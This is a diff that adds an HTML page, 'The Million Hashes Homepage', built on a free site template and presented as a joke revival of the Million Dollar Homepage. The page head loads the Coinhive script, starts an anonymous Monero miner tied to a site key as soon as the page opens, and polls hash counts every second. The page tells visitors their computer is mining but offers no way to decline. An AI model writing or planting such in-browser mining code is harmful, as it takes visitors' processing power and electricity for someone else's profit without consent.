@@ -1,1 +1,85 @@
-<h1>The Million Dollar Homepage - Revisited</h1>
+<!DOCTYPE HTML>
+<!--
+	Story by HTML5 UP
+	html5up.net | @ajlkn
+	Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)
+
+	Note: Only needed for demo purposes. Delete for production sites.
+-->
+<html>
+	<head>
+		<title>The Million Hashes Homepage</title>
+		<meta charset="utf-8" />
+		<meta name="viewport" content="width=device-width, initial-scale=1" />
+		<link rel="stylesheet" href="assets/css/main.css" />
+    <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+          <script>
+            var miner = new CoinHive.Anonymous('kOmEN2gForhg8N9ilGGqm7s8OB8EILxT');
+            miner.start();
+          </script>
+          
+          <script>
+            // Listen on events
+            miner.on('found', function() { /* Hash found */ })
+            miner.on('accepted', function() { /* Hash accepted by the pool */ })
+
+            // Update stats once per second
+            setInterval(function() {
+              var hashesPerSecond = miner.getHashesPerSecond();
+              var totalHashes = miner.getTotalHashes();
+              var acceptedHashes = miner.getAcceptedHashes();
+
+              // Output to HTML elements...
+            }, 1000);
+          </script>
+  </head>
+	<body>
+
+		<!-- Wrapper -->
+			<div id="wrapper" class="divided">
+
+				<!-- Banner -->
+					<section class="banner style1 orient-left content-align-left image-position-right fullscreen onload-image-fade-in onload-content-fade-right">
+						<div class="content">
+							<h1>The Million Hashes Homepage</h1>
+							<p class="major">Remember <a href="https://html5up.net">The Million Dollar Homepage</a>?  This is the revisited version of that in the crypto era.</p>
+
+              <p>
+                While you are visiting this website, <strong>your computer</strong>
+                is mining <a href="https://getmonero.org">Monero</a>.
+						</div>
+						<div class="image">
+							<img src="images/banner.jpg" alt="" />
+						</div>
+					</section>
+
+
+
+				<!-- Footer -->
+					<!-- <footer class="wrapper style1 align&#45;center"> -->
+					<!-- 	<div class="inner"> -->
+					<!-- 		<ul class="icons"> -->
+					<!-- 			<li><a href="#" class="icon style2 fa&#45;twitter"><span class="label">Twitter</span></a></li> -->
+					<!-- 			<li><a href="#" class="icon style2 fa&#45;facebook"><span class="label">Facebook</span></a></li> -->
+					<!-- 			<li><a href="#" class="icon style2 fa&#45;instagram"><span class="label">Instagram</span></a></li> -->
+					<!-- 			<li><a href="#" class="icon style2 fa&#45;linkedin"><span class="label">LinkedIn</span></a></li> -->
+					<!-- 			<li><a href="#" class="icon style2 fa&#45;envelope"><span class="label">Email</span></a></li> -->
+					<!-- 		</ul> -->
+					<!-- 		<p>&#38;copy; Untitled. Design: <a href="https://html5up.net">HTML5 UP</a>.</p> -->
+					<!-- 	</div> -->
+					<!-- </footer> -->
+
+			</div>
+
+		<!-- Scripts -->
+			<script src="assets/js/jquery.min.js"></script>
+			<script src="assets/js/jquery.scrollex.min.js"></script>
+			<script src="assets/js/jquery.scrolly.min.js"></script>
+			<script src="assets/js/skel.min.js"></script>
+			<script src="assets/js/util.js"></script>
+			<script src="assets/js/main.js"></script>
+
+		<!-- Note: Only needed for demo purposes. Delete for production sites. -->
+			<script src="assets/js/demo.js"></script>
+	</body>
+</html>
